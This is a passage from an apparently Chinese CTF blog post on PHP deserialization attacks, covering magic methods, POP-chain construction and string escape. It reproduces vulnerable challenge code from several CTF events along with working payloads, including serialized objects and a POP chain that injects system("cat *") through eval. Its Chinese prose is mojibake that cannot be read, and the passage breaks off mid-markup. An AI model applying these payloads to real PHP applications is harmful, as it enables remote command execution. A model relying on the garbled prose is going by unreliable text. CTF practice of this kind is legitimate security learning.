function_ invoke__">__destruct</span>()ï¼Œç±»çš„ææ„å‡½æ•°,åœ¨åˆ°æŸä¸ªå¯¹è±¡çš„æ‰€æœ‰å¼•ç”¨éƒ½è¢«åˆ é™¤æˆ–è€…å½“å¯¹è±¡è¢«æ˜¾å¼é”€æ¯æ—¶æ‰§è¡Œçš„é­”æœ¯æ–¹æ³•ã€‚</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__call</span>()ï¼Œåœ¨å¯¹è±¡ä¸­è°ƒç”¨ä¸€ä¸ªä¸å¯è®¿é—®æ–¹æ³•æ—¶,<span class="title function_ invoke__">__call</span>() ä¼šè¢«è°ƒç”¨ã€‚ä¹Ÿå°±æ˜¯è¯´ä½ è°ƒç”¨äº†ä¸€ä¸ªå¯¹è±¡ä¸­ä¸å­˜åœ¨çš„æ–¹æ³•ï¼Œå°±ä¼šè§¦å‘ã€‚</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__callStatic</span>()ï¼Œåœ¨é™æ€ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨ä¸€ä¸ªä¸å¯è®¿é—®æ–¹æ³•æ—¶ï¼Œ<span class="title function_ invoke__">__callStatic</span>() ä¼šè¢«è°ƒç”¨ã€‚</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__get</span>()ï¼Œè¯»å–ä¸å¯è®¿é—®å±æ€§çš„å€¼æ—¶ï¼Œ<span class="title function_ invoke__">__get</span>() ä¼šè¢«è°ƒç”¨ã€‚__geté­”æœ¯æ–¹æ³•éœ€è¦ä¸€ä¸ªå‚æ•°ï¼Œè¿™ä¸ªå‚æ•°ä»£è¡¨ç€è®¿é—®ä¸å­˜åœ¨çš„å±æ€§å€¼ã€‚</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__set</span>()ï¼Œç»™ä¸å¯è®¿é—®å±æ€§èµ‹å€¼æ—¶ï¼Œ<span class="title function_ invoke__">__set</span>() ä¼šè¢«è°ƒç”¨ã€‚</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__isset</span>()ï¼Œå½“å¯¹ä¸å¯è®¿é—®å±æ€§è°ƒç”¨<span class="keyword">isset</span>()æˆ–<span class="keyword">empty</span>()æ—¶è°ƒç”¨,è¯¥é­”æœ¯æ–¹æ³•ä½¿ç”¨äº†<span class="keyword">isset</span>()æˆ–è€…<span class="keyword">empty</span>()åªè¦å±æ€§æ˜¯<span class="keyword">private</span>æˆ–è€…ä¸å­˜åœ¨çš„éƒ½ä¼šè§¦å‘ã€‚</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__unset</span>()ï¼Œå½“å¯¹ä¸å¯è®¿é—®å±æ€§è°ƒç”¨<span class="keyword">unset</span>()æ—¶è¢«è°ƒç”¨ã€‚å¦‚æœä¸€ä¸ªç±»å®šä¹‰äº†é­”æœ¯æ–¹æ³• <span class="title function_ invoke__">__unset</span>() ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨ <span class="keyword">unset</span>() å‡½æ•°æ¥é”€æ¯ç±»çš„ç§æœ‰çš„å±æ€§ï¼Œæˆ–åœ¨é”€æ¯ä¸€ä¸ªä¸å­˜åœ¨çš„å±æ€§æ—¶å¾—åˆ°é€šçŸ¥ã€‚</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__sleep</span>()ï¼Œæ‰§è¡Œ<span class="title function_ invoke__">serialize</span>()æ—¶ï¼Œå…ˆä¼šè°ƒç”¨è¿™ä¸ªå‡½æ•°</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__wakeup</span>()ï¼Œæ‰§è¡Œ<span class="title function_ invoke__">unserialize</span>()æ—¶ï¼Œå…ˆä¼šè°ƒç”¨è¿™ä¸ªå‡½æ•°</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__toString</span>()ï¼Œç±»è¢«å½“æˆå­—ç¬¦ä¸²æ—¶çš„å›åº”æ–¹æ³•</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__invoke</span>()ï¼Œè°ƒç”¨å‡½æ•°çš„æ–¹å¼è°ƒç”¨ä¸€ä¸ªå¯¹è±¡æ—¶çš„å›åº”æ–¹æ³•</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__set_state</span>()ï¼Œè°ƒç”¨<span class="title function_ invoke__">var_export</span>()å¯¼å‡ºç±»æ—¶ï¼Œæ­¤é™æ€æ–¹æ³•ä¼šè¢«è°ƒç”¨ã€‚</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__clone</span>()ï¼Œå½“ä½¿ç”¨ <span class="keyword">clone</span> å…³é”®å­—æ‹·è´å®Œæˆä¸€ä¸ªå¯¹è±¡åï¼Œæ–°å¯¹è±¡ä¼šè‡ªåŠ¨è°ƒç”¨å®šä¹‰çš„é­”æœ¯æ–¹æ³• <span class="title function_ invoke__">__clone</span>() ï¼Œå¦‚æœè¯¥é­”æœ¯æ–¹æ³•å­˜åœ¨çš„è¯ã€‚</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__autoload</span>()ï¼Œå°è¯•åŠ è½½æœªå®šä¹‰çš„ç±»</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__debugInfo</span>()ï¼Œæ‰“å°æ‰€éœ€è°ƒè¯•ä¿¡æ¯</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="å°è¯•ç‰›åˆ€â€”â€“-NewStarCTF-2023-å…¬å¼€èµ›é“-Unserializeï¼Ÿ"><a href="#å°è¯•ç‰›åˆ€â€”â€“-NewStarCTF-2023-å…¬å¼€èµ›é“-Unserializeï¼Ÿ" class="headerlink" title="å°è¯•ç‰›åˆ€â€”â€“[NewStarCTF 2023 å…¬å¼€èµ›é“]Unserializeï¼Ÿ"></a>å°è¯•ç‰›åˆ€â€”â€“[NewStarCTF 2023 å…¬å¼€èµ›é“]Unserializeï¼Ÿ</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">// Maybe you need learn some knowledge about deserialize?</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">evil</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$cmd</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/cat|tac|more|tail|base/i&quot;</span>, <span class="variable">$this</span>-&gt;cmd))&#123;</span><br><span class="line">            @<span class="title function_ invoke__">system</span>(<span class="variable">$this</span>-&gt;cmd);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;unser&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span> </span><br><span class="line"></span><br><span class="line">payload:</span><br><span class="line">POST:unser=O:<span class="number">4</span>:<span class="string">&quot;evil&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">3</span>:<span class="string">&quot;cmd&quot;</span>;s:<span class="number">35</span>:<span class="string">&quot;sort /th1s_1s_fffflllll4444aaaggggg&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><h2 id="PHPçš„POPé“¾"><a href="#PHPçš„POPé“¾" class="headerlink" title="PHPçš„POPé“¾"></a>PHPçš„POPé“¾</h2><p>æŒ‰æˆ‘è‡ªå·±çš„ç†è§£ï¼ŒPHPçš„popé“¾å°±æ˜¯é€šè¿‡æ”¹å˜å¯¹è±¡çš„å±æ€§ï¼Œæ”¹å˜å¯¹è±¡çš„å…ƒç´ çš„å±æ€§ï¼Œå»è§¦å‘ç›¸åº”çš„é­”æœ¯æ–¹æ³•ï¼Œæ¥è¿›è¡Œä¸€ä¸ªé“¾å¼ååº”ï¼Œä»¥æ­¤æ¥è¾¾åˆ°æˆ‘ä»¬çš„ç›®çš„ã€‚</p><h3 id="ç¤ºä¾‹-è§¦å‘tostringæ–¹æ³•ï¼Œè¿›è¡Œé“¾å¼ååº”"><a href="#ç¤ºä¾‹-è§¦å‘tostringæ–¹æ³•ï¼Œè¿›è¡Œé“¾å¼ååº”" class="headerlink" title="ç¤ºä¾‹(è§¦å‘tostringæ–¹æ³•ï¼Œè¿›è¡Œé“¾å¼ååº”)"></a>ç¤ºä¾‹(è§¦å‘tostringæ–¹æ³•ï¼Œè¿›è¡Œé“¾å¼ååº”)</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">a</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$x</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$y</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;x;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">b</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$o</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;111&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;flag&#123;this_is_flag&#125;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a1</span> = <span class="keyword">new</span> <span class="title function_ invoke__">a</span>();</span><br><span class="line"><span class="variable">$b1</span> = <span class="keyword">new</span> <span class="title function_ invoke__">b</span>();</span><br><span class="line"><span class="variable">$a1</span>-&gt;x=<span class="keyword">new</span> <span class="title function_ invoke__">b</span>();</span><br><span class="line"><span class="variable">$s</span>=<span class="title function_ invoke__">serialize</span>(<span class="variable">$a1</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">D:\phpstudy_pro\Extensions\php\php7.<span class="number">3.4</span>nts\php.exe -c D:\phpstudy_pro\Extensions\php\php7.<span class="number">3.4</span>nts\php.ini D:\PhpstormProjects\untitled1\payload.php</span><br><span class="line"></span><br><span class="line"><span class="number">111</span>flag&#123;this_is_flag&#125;</span><br><span class="line">Process finished with <span class="keyword">exit</span> code <span class="number">0</span></span><br><span class="line"><span class="comment">//è¿™å°±æ˜¯ä¸€ä¸ªç®€å•çš„é“¾å¼ååº”</span></span><br></pre></td></tr></table></figure><h3 id="å°è¯•ç‰›åˆ€â€”â€“-MRCTF2020-Ezpop"><a href="#å°è¯•ç‰›åˆ€â€”â€“-MRCTF2020-Ezpop" class="headerlink" title="å°è¯•ç‰›åˆ€â€”â€“[MRCTF2020]Ezpop"></a>å°è¯•ç‰›åˆ€â€”â€“[MRCTF2020]Ezpop</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag is in flag.php</span></span><br><span class="line"><span class="comment">//WTF IS THIS?</span></span><br><span class="line"><span class="comment">//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95</span></span><br><span class="line"><span class="comment">//And Crack It!</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  <span class="variable">$var</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span>(<span class="params"><span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$value</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">append</span>(<span class="variable">$this</span>-&gt;<span class="keyword">var</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span>=<span class="string">&#x27;index.php&#x27;</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;source = <span class="variable">$file</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Welcome to &#x27;</span>.<span class="variable language_">$this</span>-&gt;source.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;</span>, <span class="variable">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hacker&quot;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;source = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;p = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$function</span> = <span class="variable language_">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]))&#123;</span><br><span class="line">    @<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Show</span>;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">paylodï¼š</span><br><span class="line"><span class="variable">$s</span>=<span class="keyword">new</span> <span class="title class_">Show</span>(); <span class="comment">//åˆ›å»ºshowå¯¹è±¡</span></span><br><span class="line"><span class="variable">$s</span>-&gt;source=<span class="keyword">new</span> <span class="title class_">Show</span>();  <span class="comment">//å°†sourceå±æ€§èµ‹ä¸ºä¸€ä¸ªæ–°çš„showå¯¹è±¡ï¼Œè§¦å‘tostringå‡½æ•°</span></span><br><span class="line"><span class="variable">$s</span>-&gt;source-&gt;str=<span class="keyword">new</span> <span class="title class_">Test</span>(); <span class="comment">//ç»™$a-&gt;source-&gt;stråˆ›å»ºtestå¯¹è±¡ï¼Œåˆ™$a-&gt;source-&gt;str-&gt;sourceå±æ€§ä¸å­˜åœ¨ï¼Œæ‰§è¡Œ__getå‡½æ•°</span></span><br><span class="line"><span class="variable">$s</span>-&gt;source-&gt;str-&gt;p=<span class="keyword">new</span> <span class="title class_">Modifier</span>();<span class="comment">//å°†Modifierå¯¹è±¡èµ‹ç»™på±æ€§ï¼Œä¸€ä¸ªé“¾å­å°±æ­¤å®Œæˆã€‚</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$s</span>));</span><br></pre></td></tr></table></figure><h2 id="2022DASCTF-X-SU-ä¸‰æœˆæ˜¥å­£æŒ‘æˆ˜èµ›-ezpop"><a href="#2022DASCTF-X-SU-ä¸‰æœˆæ˜¥å­£æŒ‘æˆ˜èµ›-ezpop" class="headerlink" title="[2022DASCTF X SU ä¸‰æœˆæ˜¥å­£æŒ‘æˆ˜èµ›]ezpop"></a>[2022DASCTF X SU ä¸‰æœˆæ˜¥å­£æŒ‘æˆ˜èµ›]ezpop</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">crow</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$v1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$v2</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">eval</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">new</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">v1</span>(<span class="variable">$this</span>-&gt;v2);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;v1-&gt;<span class="title function_ invoke__">world</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">fin</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$f1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;f1 . <span class="string">&#x27;114514&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        (<span class="variable language_">$this</span>-&gt;f1)();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$a</span>, <span class="variable">$b</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;f1-&gt;<span class="title function_ invoke__">get_flag</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">what</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a-&gt;<span class="title function_ invoke__">run</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;hello&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">mix</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$m1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        (<span class="variable language_">$this</span>-&gt;m1)();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_flag</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&#x27;#&#x27;</span> . <span class="variable language_">$this</span>-&gt;m1);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">fin</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;f1=<span class="keyword">new</span> <span class="title function_ invoke__">what</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;f1-&gt;a=<span class="keyword">new</span> <span class="title function_ invoke__">mix</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;f1-&gt;a-&gt;m1=<span class="keyword">new</span> <span class="title function_ invoke__">crow</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;f1-&gt;a-&gt;m1-&gt;v1=<span class="keyword">new</span> <span class="title function_ invoke__">fin</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;f1-&gt;a-&gt;m1-&gt;v1-&gt;f1=<span class="keyword">new</span> <span class="title function_ invoke__">mix</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;f1-&gt;a-&gt;m1-&gt;v1-&gt;f1-&gt;m1=<span class="string">&#x27;?&gt;&lt;?php system(&quot;cat *&quot;)?&gt;&#x27;</span>;<span class="comment">//è¿™é¢˜å¤ªç‹—äº†ï¼ŒæŠŠflagæ”¾åœ¨æ³¨é‡Šé‡Œï¼Œè¿˜å¾—cat *æ‰èƒ½çœ‹åˆ°ã€‚</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure><h2 id="PHPçš„å­—ç¬¦ä¸²é€ƒé€¸"><a href="#PHPçš„å­—ç¬¦ä¸²é€ƒé€¸" class="headerlink" title="PHPçš„å­—ç¬¦ä¸²é€ƒé€¸"></a>PHPçš„å­—ç¬¦ä¸²é€ƒé€¸</h2><p>å­—ç¬¦ä¸²é€ƒé€¸å°±æ˜¯é€šè¿‡æ”¹å˜å­—ç¬¦ä¸²çš„é•¿åº¦æ¥æ”¹å˜é”®å€¼å¯¹ï¼Œè®©é”®å€¼å¯¹æ”¹å˜æˆæˆ‘ä»¬æƒ³è¦çš„æ ·å­ï¼Œè¿™ä¸ªå°±è·Ÿphpçš„ç‰¹æ€§æœ‰å…³äº†</p><h3 id="PHPçš„ç‰¹æ€§"><a href="#PHPçš„ç‰¹æ€§" class="headerlink" title="PHPçš„ç‰¹æ€§"></a>PHPçš„ç‰¹æ€§</h3><h4 id="1ã€åºåˆ—åŒ–åï¼Œåº•å±‚ä»£ç æ˜¯ä»¥-ä½œä¸ºå­—æ®µçš„åˆ†éš”ï¼Œä»¥-ä½œä¸ºç»“å°¾-å­—ç¬¦ä¸²é™¤å¤–-ï¼Œæ‰€ä»¥-åœ¨åé¢çš„æ˜¯æ²¡æœ‰ä»»ä½•å½±å“çš„"><a href="#1ã€åºåˆ—åŒ–åï¼Œåº•å±‚ä»£ç æ˜¯ä»¥-ä½œä¸ºå­—æ®µçš„åˆ†éš”ï¼Œä»¥-ä½œä¸ºç»“å°¾-å­—ç¬¦ä¸²é™¤å¤–-ï¼Œæ‰€ä»¥-åœ¨åé¢çš„æ˜¯æ²¡æœ‰ä»»ä½•å½±å“çš„" class="headerlink" title="1ã€åºåˆ—åŒ–åï¼Œåº•å±‚ä»£ç æ˜¯ä»¥ ; ä½œä¸ºå­—æ®µçš„åˆ†éš”ï¼Œä»¥ } ä½œä¸ºç»“å°¾(å­—ç¬¦ä¸²é™¤å¤–)ï¼Œæ‰€ä»¥}åœ¨åé¢çš„æ˜¯æ²¡æœ‰ä»»ä½•å½±å“çš„"></a>1ã€åºåˆ—åŒ–åï¼Œåº•å±‚ä»£ç æ˜¯ä»¥ ; ä½œä¸ºå­—æ®µçš„åˆ†éš”ï¼Œä»¥ } ä½œä¸ºç»“å°¾(å­—ç¬¦ä¸²é™¤å¤–)ï¼Œæ‰€ä»¥}åœ¨åé¢çš„æ˜¯æ²¡æœ‰ä»»ä½•å½±å“çš„</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 